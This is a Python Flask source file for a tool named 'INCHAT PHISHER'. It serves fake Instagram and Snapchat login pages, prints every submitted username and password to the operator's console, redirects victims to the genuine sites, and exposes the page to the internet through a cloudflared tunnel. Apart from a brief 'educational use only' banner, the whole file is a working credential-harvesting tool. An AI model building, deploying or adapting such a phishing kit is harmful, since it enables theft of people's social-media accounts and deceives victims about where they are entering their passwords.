from flask import Flask, request, send_from_directory, redirect
import re
import threading
import subprocess

app = Flask(__name__)

selected_app = None

@app.route("/")
def home():
    if selected_app == "instagram":
        return redirect("/instagram")
    elif selected_app == "snapchat":
        return redirect("/snapchat")
    return "No app selected"


#------------  INSTAGRAM  -------------#

@app.route("/instagram", methods=["GET", "POST"])
def instagram():

    if request.method == "POST":

        username = request.form.get("username")
        password = request.form.get("password")

        print()
        print("         INSTAGRAM ")
        print("=" * 40)
        print("Username:", username)
        print("Password:", password)
        print("=" * 40)
        print()

        return redirect("https://www.instagram.com/")

    return send_from_directory(
        "instagram",
        "index1.html"
    )


@app.route("/instagram/<path:filename>")
def instagram_files(filename):

    return send_from_directory(
        "instagram",
        filename
    )


#------------  SNAPCHAT  -------------#

@app.route("/snapchat", methods=["GET", "POST"])
def snapchat():

    if request.method == "POST":

        username = request.form.get("username")
        password = request.form.get("password")

        print()
        print("               SNAPCHAT ")
        print("=" * 40)
        print("Username:", username)
        print("Password:", password)
        print("=" * 40)
        print()

        return redirect("https://www.snapchat.com/")

    return send_from_directory(
        "snapchat",
        "index2.html"
    )


@app.route("/snapchat/<path:filename>")
def snapchat_files(filename):

    return send_from_directory(
        "snapchat",
        filename
    )


# START

if __name__ == "__main__":

    print()
    print("=" * 40)
    print("             INCHAT PHISHER")
    print("⚠️  Educational use only | Do not misuse it.")
    print("   Unauthorized use may be a cybercrime. ")
    print("=" * 40)
    print()

    print("1. Instagram ")
    print("2. Snapchat ")
    print("3. Exit")
    print()

    choice = input("Choose: ").strip()

    if choice == "1":

        selected_app = "instagram"

        url = "http://127.0.0.1:5000/instagram"

        print()
        print("Instagram selected... ")
        print("Starting server...")
        print()

    elif choice == "2":

        selected_app = "snapchat"

        url = "http://127.0.0.1:5000/snapchat"

        print()
        print("Snapchat selected...")
        print("Starting server...")
        print()

    elif choice == "3":

        print("Bye 👋")
        exit()

    else:

        print("❌ Invalid choice")
        exit()

    
    cloudflared = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", "http://127.0.0.1:5000"],
    stdout=subprocess.PIPE,
    stderr=subprocess.STDOUT,
    text=True,
    bufsize=1
    )

    def get_cloudflare_url():
        for line in cloudflared.stdout:
            match = re.search(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com", line)
            if match:
                print(f" * Running on {match.group(0)}")
                break

    threading.Thread(target=get_cloudflare_url, daemon=True).start()



    # Flask server
    app.run(
        host="127.0.0.1",
        port=5000,
        debug=False
    )

